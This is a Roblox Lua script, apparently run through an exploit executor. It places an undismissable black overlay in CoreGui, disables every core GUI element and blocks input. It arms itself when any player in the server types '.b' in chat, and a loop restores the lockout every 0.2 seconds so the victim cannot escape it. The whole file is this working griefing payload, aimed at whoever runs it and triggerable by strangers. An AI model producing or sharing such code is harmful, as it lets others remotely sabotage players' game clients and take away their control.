local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer

-- Disable core GUI elements
local function disableCoreGuis()
    for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
        pcall(function()
            StarterGui:SetCoreGuiEnabled(guiType, false)
        end)
    end
end

-- Remove old blocker if exists
if CoreGui:FindFirstChild("AbsoluteBlocker") then
    CoreGui.AbsoluteBlocker:Destroy()
end

-- Create the blocker GUI but don't parent it yet
local Blocker = Instance.new("ScreenGui")
Blocker.Name = "AbsoluteBlocker"
Blocker.ResetOnSpawn = false
Blocker.IgnoreGuiInset = true
Blocker.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local Cover = Instance.new("Frame")
Cover.Size = UDim2.new(1, 0, 1, 0)
Cover.Position = UDim2.new(0, 0, 0, 0)
Cover.BackgroundColor3 = Color3.new(0, 0, 0)  -- Black color
Cover.BackgroundTransparency = 0  -- No transparency (fully black)
Cover.Active = true
Cover.Selectable = true
Cover.ZIndex = 999999
Cover.Parent = Blocker

-- Function to activate the blocker
local function activateBlocker()
    Blocker.Parent = CoreGui
    UserInputService.ModalEnabled = true
    
    -- Auto-regenerate loop
    task.spawn(function()
        while true do
            task.wait(0.2)
            -- Re-disable CoreGuis in case Roblox tries to re-enable
            disableCoreGuis()

            if not CoreGui:FindFirstChild("AbsoluteBlocker") then
                Blocker.Parent = CoreGui
            end
            if not Cover.Parent then
                Cover.Parent = Blocker
            end
        end
    end)
end

-- Listen for ALL chat messages, not just local player
local function onPlayerAdded(player)
    player.Chatted:Connect(function(message)
        if message == ".b" then
            activateBlocker()
        end
    end)
end

-- Set up chat listener for all players
for _, player in pairs(Players:GetPlayers()) do
    onPlayerAdded(player)
end

Players.PlayerAdded:Connect(onPlayerAdded)

-- Don't activate anything on script start - wait for chat command
print("Script loaded - waiting for .b command from any player")
